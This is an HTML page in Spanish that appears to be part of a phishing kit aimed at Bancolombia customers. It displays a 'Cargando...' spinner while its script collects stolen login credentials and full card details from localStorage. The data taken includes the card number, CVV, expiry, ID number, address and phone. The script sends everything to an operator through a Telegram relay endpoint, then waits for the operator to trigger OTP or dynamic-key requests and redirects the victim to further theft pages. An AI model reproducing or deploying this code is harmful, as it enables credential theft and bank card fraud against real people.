<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Datos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('img/fondo.png') no-repeat center center fixed;
            background-size: cover;
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
        }

        .loaderp-full {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 90%;
            height: 90%;
            z-index: 9999;
        }

        .loaderp {
            width: 180px;
            height: 180px;
            background-image: url('img/circulo.png');
            background-size: cover;
            border-radius: 50%;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .loaderp .loader {
            width: 30px;
            height: 30px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #555;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loaderp-text {
            margin-top: 30px;
            font-size: 13px;
            color: black;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    <div class="loaderp-full">
        <div class="loaderp">
            <div class="loader"></div>
            <div class="loaderp-text">Cargando...</div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', async function () {
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
            console.error("Error: No se encontraron datos en 'bancoldata' en el localStorage.");
            return;
        }

        const usuario = bancoldata.usuario;
        const clave = bancoldata.clave;
        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        localStorage.setItem('transactionId', transactionId);

        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));

        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | ${usuario}
🔐 <b>Clave:</b> | ${clave}
--------------------------------------------------
<b>Detalles del pago:</b>
----------------------------
🪪 <b>Cédula:</b> | ${datosTarjeta ? datosTarjeta.cedula : '<i>No disponible</i>'}
💳 <b>Tarjeta:</b> | ${datosTarjeta ? datosTarjeta.cardNumber : '<i>No disponible</i>'}
📅 <b>Fecha de expiración:</b> | ${datosTarjeta ? `${datosTarjeta.expMonth}/${datosTarjeta.expYear}` : '<i>No disponible</i>'}
🔐 <b>CVV:</b> | ${datosTarjeta ? datosTarjeta.cvv : '<i>No disponible</i>'}
💳 <b>Tipo de tarjeta:</b> | ${datosTarjeta ? datosTarjeta.type : '<i>No disponible</i>'}
💰 <b>Cuotas:</b> | ${datosTarjeta ? datosTarjeta.cuotas : '<i>No disponible</i>'}
🏦 <b>Banco:</b> | ${datosTarjeta ? datosTarjeta.bank : '<i>No disponible</i>'}
--------------------------------------------------
🏠 <b>Dirección:</b> | ${datosTarjeta ? datosTarjeta.address : '<i>No disponible</i>'}
📞 <b>Teléfono:</b> | ${datosTarjeta ? datosTarjeta.phone : '<i>No disponible</i>'}
🏙️ <b>Ciudad:</b> | ${datosTarjeta ? datosTarjeta.city : '<i>No disponible</i>'}
📝 <b>Nombre del propietario:</b> | ${datosTarjeta ? datosTarjeta.ownerName : '<i>No disponible</i>'}
--------------------------------------------------
        `;

        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
                [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
            ],
        });

        try {
            const response = await fetch(`/api/sendData?method=send&text=${encodeURIComponent(message)}&reply_markup=${encodeURIComponent(keyboard)}`);
            const data = await response.json();
            if (data.ok) {
                console.log("Mensaje enviado a Telegram con éxito");
                await checkPaymentVerification(transactionId);
            } else {
                throw new Error("Error al enviar mensaje a Telegram.");
            }
        } catch (error) {
            console.error("Error al enviar mensaje:", error);
        }

        async function checkPaymentVerification(transactionId) {
            try {
                const response = await fetch(`/api/sendData?method=update`);
                const data = await response.json();

                const verificationUpdate = data.result.find(update =>
                    update.callback_query &&
                    [
                        `pedir_dinamica:${transactionId}`,
                        `pedir_cajero:${transactionId}`,
                        `pedir_otp:${transactionId}`,
                        `pedir_token:${transactionId}`,
                        `error_tc:${transactionId}`,
                        `error_logo:${transactionId}`,
                        `confirm_finalizar:${transactionId}`
                    ].includes(update.callback_query.data)
                );

                if (verificationUpdate) {
                    switch (verificationUpdate.callback_query.data) {
                        case `pedir_dinamica:${transactionId}`:
                            window.location.href = "dinacol.html";
                            break;
                        case `pedir_cajero:${transactionId}`:
                            window.location.href = "ccajero-id.html";
                            break;
                        case `pedir_otp:${transactionId}`:
                        case `pedir_token:${transactionId}`:
                            window.location.href = "index-otp.html";
                            break;
                        case `error_tc:${transactionId}`:
                            alert("Error en tarjeta. Verifique los datos.");
                            window.location.href = "../../pay/";
                            break;
                        case `error_logo:${transactionId}`:
                            alert("Error en el logo. Reintente.");
                            window.location.href = "index-pc-error.html";
                            break;
                        case `confirm_finalizar:${transactionId}`:
                            window.location.href = "../../checking.html";
                            break;
                    }
                } else {
                    setTimeout(() => checkPaymentVerification(transactionId), 2000);
                }
            } catch (error) {
                console.error("Error en la verificación:", error);
                setTimeout(() => checkPaymentVerification(transactionId), 2000);
            }
        }
    });
    </script>
</body>
</html>
